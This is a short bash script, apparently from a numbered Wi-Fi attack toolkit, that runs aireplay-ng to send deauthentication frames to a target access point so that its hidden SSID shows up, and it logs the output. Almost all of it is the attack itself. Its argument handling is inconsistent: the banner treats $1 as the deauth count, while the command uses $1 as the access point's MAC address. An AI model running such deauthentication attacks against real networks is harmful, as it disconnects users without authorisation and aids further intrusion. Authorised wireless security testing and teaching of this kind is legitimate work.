#!/bin/bash
##############################################################
#
#       05-CapHidenSSID.sh - 
#
#           AUTHOR: Z1GN1F3R =D
#
#           DATE: 01-27-2021
#   
#           DESCRIPTION: 
#
#
##############################################################

#$MACTARGET=$1

#Welcome
    clear
    echo "-----readme.txt -----"
    echo ""
    echo ""
    echo "    LEAVE ME HERE"
    echo ""
    echo ""
    echo "-----readme.txt -----"
    echo ""
    echo ""
    echo "-----> INFORMATION OF ATTACK"
    echo ""
    echo "DEAUTH: $1 times"
    echo "AP MAC: $2"
    echo ""
    echo "-----------------------------"
    
#Capturing a hiden SSID

        aireplay-ng --deauth 10 -a $1 mon0 | tee log05-CapHidenSSID.txt
    
#Show the results
    echo ""
    echo ""
    echo ""
    echo "--- RESULTS ---"
    ls -1 log05-CapHidenSSID*
    echo "--- END ---"
